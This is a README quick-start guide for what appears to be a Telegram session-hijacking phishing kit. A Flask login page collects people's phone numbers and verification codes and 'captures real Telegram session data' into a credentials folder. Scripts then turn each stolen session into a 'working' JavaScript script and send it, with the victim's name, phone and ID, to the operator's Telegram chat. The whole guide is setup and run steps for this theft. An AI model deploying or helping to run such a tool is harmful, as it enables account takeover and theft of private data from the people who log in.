# 🚀 Quick Start Guide - Telegram Bot & Script Generator

This guide will help you run the main application and generate working scripts for all stored sessions.

## 📋 Prerequisites

1. **Python 3.7+** installed
2. **Dependencies** installed: `pip install -r requirements.txt`
3. **Environment variables** configured in `.env` file

## ⚙️ Setup

### 1. Install Dependencies
```bash
pip install -r requirements.txt
```

### 2. Configure Environment
Create a `.env` file with these variables:
```bash
# Bot Configuration
TELEGRAM_BOT_TOKEN=your_bot_token_here
BOT_USERNAME=your_bot_username

# Telegram API Configuration
TELEGRAM_API_ID=your_api_id
TELEGRAM_API_HASH=your_api_hash

# Script Sending Configuration
SCRIPT_TARGET_USER_ID=your_telegram_user_id

# Flask Configuration
SECRET_KEY=your_secret_key
FLASK_ENV=development
PORT=5000
HOST=0.0.0.0
```

### 3. Get Your User ID
- Start a chat with your bot
- Send any message to the bot
- Check the bot logs to find your user ID
- Add it to `SCRIPT_TARGET_USER_ID` in your `.env` file

## 🎯 Main Workflow

### Step 1: Run the Main Application
```bash
python main.py
```

**What this does:**
- ✅ Starts the Flask web server
- ✅ Opens the login interface at `http://localhost:5000`
- ✅ Allows users to authenticate with phone numbers
- ✅ Captures real Telegram session data
- ✅ Saves credentials to `credentials/` folder

### Step 2: Generate and Send Scripts
```bash
python generate_all_scripts.py
```

**What this does:**
- ✅ Finds ALL stored credential files
- ✅ Generates working JavaScript scripts for each session
- ✅ Saves scripts to `credentials/` folder
- ✅ Sends each script separately to your Telegram chat
- ✅ Handles long messages by splitting them if needed

## 📁 File Structure

```
TGBot-main/
├── main.py                    # Main Flask application
├── generate_all_scripts.py    # Generate scripts for all sessions
├── generate_working_script.py # Generate script for latest session
├── config.py                  # Configuration settings
├── requirements.txt           # Python dependencies
├── .env                       # Environment variables (create this)
├── credentials/               # Stored sessions and scripts
├── templates/                 # HTML templates
├── static/                    # Static files
└── utils/                     # Utility modules
    └── tg/                    # Telegram utilities
        ├── auth.py            # Authentication logic
        └── bot.py             # Bot implementation
```

## 🔄 Complete Workflow Example

1. **Start the application:**
   ```bash
   python main.py
   ```

2. **Open browser:** `http://localhost:5000`

3. **Login with phone number:**
   - Enter phone number
   - Receive verification code
   - Complete authentication

4. **Generate and send scripts:**
   ```bash
   python generate_all_scripts.py
   ```

5. **Check Telegram:** Receive all scripts in your chat

## 📊 Script Generation Options

### Generate Latest Session Only
```bash
python generate_working_script.py
```
- Generates script for the most recent session
- Sends to configured user ID

### Generate All Sessions
```bash
python generate_all_scripts.py
```
- Generates scripts for ALL stored sessions
- Sends each script separately
- Shows progress and summary

## 🔧 Configuration Options

### Environment Variables
- `SCRIPT_TARGET_USER_ID`: Your Telegram user ID to receive scripts
- `TELEGRAM_BOT_TOKEN`: Your bot token
- `TELEGRAM_API_ID`: Your Telegram API ID
- `TELEGRAM_API_HASH`: Your Telegram API hash

### Script Customization
Edit `generate_all_scripts.py` to customize:
- Message format
- Instructions included
- Tips included
- Telegram sending enabled/disabled

## 🚨 Troubleshooting

### Bot Not Sending Messages
- Check bot token in `.env`
- Ensure bot is running
- Verify user has started chat with bot

### No Scripts Generated
- Check if credential files exist in `credentials/`
- Verify session data is valid
- Check logs for errors

### Environment Issues
- Ensure `.env` file exists
- Check all required variables are set
- Verify Python dependencies are installed

## 📱 What You'll Receive

Each script sent to Telegram includes:
- 📁 Script filename and generation time
- 👤 User information (name, phone, ID)
- 📊 Session number and total count
- 📝 Step-by-step instructions
- 💡 Helpful tips for usage
- 🔗 Complete script content

## 🎉 Success Indicators

- ✅ Flask server running on port 5000
- ✅ Web interface accessible
- ✅ Credentials saved to `credentials/` folder
- ✅ Scripts generated and sent to Telegram
- ✅ All messages delivered successfully

## 🔒 Security Notes

- Only share scripts with trusted users
- Keep your API credentials secure
- Regularly update your bot token
- Monitor for unauthorized access

---

**Need help?** Check the logs in `safeguard_bot.log` for detailed information. 